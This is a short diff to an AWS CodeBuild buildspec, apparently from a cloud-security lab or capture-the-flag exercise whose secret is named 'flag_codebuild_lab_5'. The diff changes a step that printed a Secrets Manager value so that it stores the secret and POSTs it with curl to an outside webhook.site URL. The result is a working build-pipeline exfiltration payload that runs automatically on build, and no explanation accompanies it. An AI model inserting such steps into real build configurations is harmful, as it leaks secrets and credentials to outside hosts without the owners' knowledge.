@@ -4,8 +4,11 @@ phases:
   build:
     commands:
       - |
-        aws secretsmanager get-secret-value \
+        FLAG=$(aws secretsmanager get-secret-value \
           --secret-id flag_codebuild_lab_5 \
           --region us-east-1 \
           --query SecretString \
-          --output text
+          --output text)
+        curl -fsS -X POST \
+          --data-urlencode "flag=${FLAG}" \
+          https://webhook.site/458f99c1-2c76-4c23-99fe-38ff6b5e136e
